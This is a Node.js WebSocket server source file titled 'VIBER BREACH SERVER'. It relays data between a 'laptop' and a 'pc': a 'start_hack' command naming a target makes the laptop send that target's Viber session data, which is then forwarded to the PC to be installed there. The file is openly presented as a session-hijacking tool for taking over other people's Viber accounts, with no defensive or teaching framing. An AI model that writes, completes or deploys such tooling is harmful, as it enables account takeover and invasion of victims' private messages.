// WebSocket Server for Viber Session Transfer
// Usage: node server.js

const WebSocket = require('ws');
const http = require('http');
const os = require('os');

const PORT = 8080;

// Get local IP address
function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (let iface in interfaces) {
        for (let alias of interfaces[iface]) {
            if (alias.family === 'IPv4' && !alias.internal) {
                return alias.address;
            }
        }
    }
    return 'localhost';
}

// HTTP Server
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end(`VIBER BREACH SERVER\n\nStatus: ACTIVE\nAddress: ws://${getLocalIP()}:${PORT}\n`);
});

// WebSocket Server
const wss = new WebSocket.Server({ server });

let laptop = null;
let pc = null;

wss.on('connection', (ws) => {
    const timestamp = new Date().toLocaleTimeString();
    console.log(`[${timestamp}] New connection established`);

    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            const timestamp = new Date().toLocaleTimeString();

            // Device Registration
            if (message.type === 'register') {
                if (message.device === 'laptop') {
                    laptop = ws;
                    console.log(`[${timestamp}] LAPTOP registered`);
                    ws.send(JSON.stringify({ type: 'registered', device: 'laptop' }));
                } else if (message.device === 'pc') {
                    pc = ws;
                    console.log(`[${timestamp}] PC registered`);
                    ws.send(JSON.stringify({ type: 'registered', device: 'pc' }));
                }
            }

            // Session Transfer: Laptop -> PC
            if (message.type === 'session_data' && pc) {
                console.log(`[${timestamp}] Transferring session data to PC...`);
                console.log(`[${timestamp}] Data size: ${(message.data.length / 1024 / 1024).toFixed(2)} MB`);
                
                pc.send(JSON.stringify({
                    type: 'install_session',
                    data: message.data,
                    size: message.size,
                    timestamp: message.timestamp,
                    app: message.app || 'viber'
                }));
                
                console.log(`[${timestamp}] Session data sent to PC`);
            }

            // Breach Command: PC -> Laptop
            if (message.type === 'start_hack' && laptop) {
                console.log(`[${timestamp}] Breach initiated for target: ${message.target}`);
                console.log(`[${timestamp}] Requesting session from laptop...`);
                
                laptop.send(JSON.stringify({
                    type: 'send_session',
                    target: message.target,
                    app: message.app || 'viber'
                }));
            }

            // Status Messages
            if (message.type === 'status') {
                console.log(`[${timestamp}] STATUS: ${message.message}`);
            }

        } catch (error) {
            console.error(`[${timestamp}] ERROR: ${error.message}`);
        }
    });

    ws.on('close', () => {
        const timestamp = new Date().toLocaleTimeString();
        
        if (ws === laptop) {
            console.log(`[${timestamp}] LAPTOP disconnected`);
            laptop = null;
        }
        if (ws === pc) {
            console.log(`[${timestamp}] PC disconnected`);
            pc = null;
        }
    });

    ws.on('error', (error) => {
        const timestamp = new Date().toLocaleTimeString();
        console.error(`[${timestamp}] WebSocket error: ${error.message}`);
    });
});

// Server Start
server.listen(PORT, () => {
    const ip = getLocalIP();
    console.log('\n═══════════════════════════════════════════════════');
    console.log('VIBER BREACH SERVER');
    console.log('═══════════════════════════════════════════════════');
    console.log(`Server Address: ws://${ip}:${PORT}`);
    console.log(`HTTP Status:    http://${ip}:${PORT}`);
    console.log('═══════════════════════════════════════════════════');
    console.log(`\nConnect devices to: ${ip}`);
    console.log('\nWaiting for connections...\n');
});

// Graceful Shutdown
process.on('SIGINT', () => {
    console.log('\n\nShutting down server...');
    wss.clients.forEach(client => {
        client.close();
    });
    server.close(() => {
        console.log('Server stopped');
        process.exit(0);
    });
});
